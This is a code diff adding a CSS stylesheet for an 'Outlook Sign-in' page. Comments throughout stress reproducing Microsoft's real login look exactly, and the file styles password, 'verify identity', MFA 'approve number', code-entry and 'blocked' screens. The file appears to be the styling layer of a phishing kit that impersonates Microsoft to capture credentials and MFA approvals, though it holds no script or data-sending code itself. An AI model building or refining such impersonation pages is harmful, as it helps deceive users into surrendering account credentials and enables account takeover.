@@ -1,0 +1,337 @@
+/* ═══════════════════════════════════════════
+   Outlook Sign-in — Microsoft Light Theme
+   Mobile-first · No scroll · Exact sizing
+═══════════════════════════════════════════ */
+@import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap');
+
+*,*::before,*::after { box-sizing:border-box; margin:0; padding:0; }
+
+html, body {
+    height: 100%;
+    min-height: 100dvh;
+    overflow: hidden;
+    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+}
+
+/* ── Animated background matching Microsoft's gradient mesh ── */
+.page-bg {
+    width: 100%;
+    height: 100dvh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    gap: 12px;
+    overflow: hidden;
+    position: relative;
+    background: #f3f2f1;
+    /* Animated gradient mesh like real Microsoft login */
+    background-image:
+        radial-gradient(ellipse 80% 60% at 20% 20%, rgba(180,190,220,0.55) 0%, transparent 60%),
+        radial-gradient(ellipse 60% 80% at 80% 80%, rgba(200,185,230,0.4) 0%, transparent 55%),
+        radial-gradient(ellipse 70% 50% at 60% 10%, rgba(210,220,240,0.5) 0%, transparent 50%),
+        radial-gradient(ellipse 50% 70% at 10% 80%, rgba(185,195,225,0.35) 0%, transparent 50%);
+    background-size: 100% 100%;
+    animation: bgShift 12s ease-in-out infinite alternate;
+}
+
+@keyframes bgShift {
+    0%   { background-position: 0% 0%, 100% 100%, 60% 10%, 10% 80%; }
+    50%  { background-position: 5% 5%, 95% 95%, 65% 15%, 15% 75%; }
+    100% { background-position: 2% 8%, 98% 92%, 58% 12%, 12% 82%; }
+}
+
+/* Dark purple top border — exact Microsoft styling */
+.page-bg::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 4px;
+    background: linear-gradient(90deg, #0f0f3c 0%, #1a1a6e 40%, #2d2d8e 100%);
+    z-index: 100;
+}
+
+/* ── Card wrap (contains main card + sign-in options) ── */
+.card-wrap {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    width: 100%;
+    max-width: 380px;
+    animation: fadeUp .2s ease both;
+}
+
+@keyframes fadeUp {
+    from { opacity:0; transform:translateY(10px); }
+    to   { opacity:1; transform:translateY(0); }
+}
+
+/* ── Main card ── */
+.card {
+    position: relative;
+    z-index: 2;
+    background: #ffffff;
+    border-radius: 0;           /* Microsoft uses sharp corners */
+    padding: 44px 40px 36px;
+    width: 100%;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+}
+
+/* Sign-in options card below main card */
+.card-options {
+    background: #ffffff;
+    border-radius: 0;
+    padding: 0;
+    width: 100%;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.10);
+    overflow: hidden;
+}
+.options-row {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 16px 20px;
+    cursor: pointer;
+    transition: background .15s;
+    border: none;
+    background: none;
+    width: 100%;
+    text-align: left;
+}
+.options-row:hover { background: #f5f5f5; }
+.options-icon {
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    background: #f0f0f0;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+}
+.options-row span { font-size: 15px; color: #1b1b1b; }
+
+/* Mobile adjustments */
+@media (max-width: 480px) {
+    .card { padding: 36px 24px 28px; }
+    .card-wrap { max-width: 100%; }
+}
+
+/* ── Microsoft logo row ── */
+.ms-logo-wrap { margin-bottom: 16px; }
+
+/* ── Back / email link ── */
+.back-email {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 13px;
+    color: #1b1b1b;
+    text-decoration: none;
+    margin-bottom: 16px;
+    opacity: 0.85;
+}
+.back-email:hover { opacity: 1; }
+
+/* ── Headings ── */
+.card-title {
+    font-size: 24px;
+    font-weight: 600;
+    color: #1b1b1b;
+    margin-bottom: 20px;
+    line-height: 1.2;
+}
+.card-email-display {
+    font-size: 15px;
+    color: #1b1b1b;
+    margin-bottom: 16px;
+}
+.card-sub {
+    font-size: 14px;
+    color: #444;
+    margin-bottom: 20px;
+    line-height: 1.5;
+}
+
+/* ── Microsoft-style underline input ── */
+.ms-field {
+    position: relative;
+    margin-bottom: 4px;
+}
+.ms-field input {
+    width: 100%;
+    height: 40px;
+    padding: 8px 0 6px;
+    background: transparent;
+    border: none;
+    border-bottom: 1px solid #666;
+    color: #1b1b1b;
+    font-size: 15px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color .15s;
+    border-radius: 0;
+}
+.ms-field input:focus { border-bottom: 2px solid #0067b8; }
+.ms-field input.err   { border-bottom: 2px solid #d93025; }
+.ms-field input::placeholder { color: #767676; font-size: 15px; }
+
+/* ── Error text (Microsoft red) ── */
+.err-text {
+    display: flex;
+    align-items: flex-start;
+    gap: 5px;
+    color: #d93025;
+    font-size: 13px;
+    margin: 6px 0 12px;
+    line-height: 1.4;
+    min-height: 16px;
+}
+
+/* ── Links ── */
+.ms-link {
+    color: #0067b8;
+    font-size: 13px;
+    text-decoration: none;
+    display: inline-block;
+    margin: 8px 0;
+}
+.ms-link:hover { text-decoration: underline; }
+
+/* ── Microsoft blue button ── */
+.btn-ms {
+    background: #0067b8;
+    color: #fff;
+    border: none;
+    border-radius: 0;
+    padding: 0 28px;
+    height: 40px;
+    font-size: 15px;
+    font-weight: 400;
+    font-family: inherit;
+    cursor: pointer;
+    transition: background .15s;
+    white-space: nowrap;
+    margin-top: 24px;
+    float: right;
+}
+.btn-ms:hover  { background: #005a9e; }
+.btn-ms:active { background: #004f8a; }
+
+/* ── Cancel / secondary button ── */
+.btn-cancel {
+    background: #e6e6e6;
+    color: #1b1b1b;
+    border: none;
+    border-radius: 0;
+    padding: 0 20px;
+    height: 40px;
+    font-size: 15px;
+    font-family: inherit;
+    cursor: pointer;
+    transition: background .15s;
+    float: right;
+    margin-top: 24px;
+}
+.btn-cancel:hover { background: #d9d9d9; }
+
+/* Clear float */
+.btn-row-ms {
+    display: flex;
+    justify-content: flex-end;
+    gap: 8px;
+    margin-top: 28px;
+    align-items: center;
+}
+
+/* ── Loading spinner ── */
+.loading-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 20px;
+    padding: 40px 0 20px;
+}
+.ms-spinner {
+    width: 36px; height: 36px;
+    border: 3px solid #e0e0e0;
+    border-top-color: #0067b8;
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+.loading-title { font-size: 16px; color: #1b1b1b; font-weight: 600; }
+.loading-sub   { font-size: 13px; color: #666; }
+
+/* ── Verify identity option rows ── */
+.verify-option {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 0;
+    border-bottom: 1px solid #e8e8e8;
+    cursor: pointer;
+    text-decoration: none;
+    transition: background .1s;
+}
+.verify-option:last-of-type { border-bottom: none; }
+.verify-option:hover { background: #f5f5f5; margin: 0 -4px; padding-left: 4px; padding-right: 4px; }
+.verify-option-icon {
+    width: 40px; height: 40px;
+    border-radius: 50%;
+    background: #f0f0f0;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+}
+.verify-option-text { font-size: 15px; color: #1b1b1b; }
+.verify-option.active { background: #f0f6ff; }
+.verify-option.active .verify-option-text { color: #0067b8; }
+
+/* ── Approve number box ── */
+.approve-number {
+    display: block;
+    width: 80px; height: 56px;
+    border: 2px solid #1b1b1b;
+    margin: 20px auto;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    font-weight: 600;
+    color: #1b1b1b;
+    border-radius: 4px;
+    animation: popNum .3s cubic-bezier(.34,1.56,.64,1) both;
+}
+@keyframes popNum { from{opacity:0;transform:scale(.7)} to{opacity:1;transform:scale(1)} }
+
+/* ── Blocked / error pages ── */
+.info-icon {
+    width: 56px; height: 56px;
+    border-radius: 50%;
+    background: #fff0f0;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 24px;
+    margin-bottom: 16px;
+}
+
+/* ── Footer ── */
+.page-footer {
+    position: fixed;
+    bottom: 16px;
+    right: 20px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+.page-footer a {
+    color: #444;
+    font-size: 12px;
+    text-decoration: none;
+}
+.page-footer a:hover { text-decoration: underline; }
+.footer-dots { color: #888; font-size: 12px; }
+
+/* ── Code input field ── */
+.ms-field input[inputmode="numeric"] {
+    letter-spacing: 2px;
+    font-size: 18px;
+}
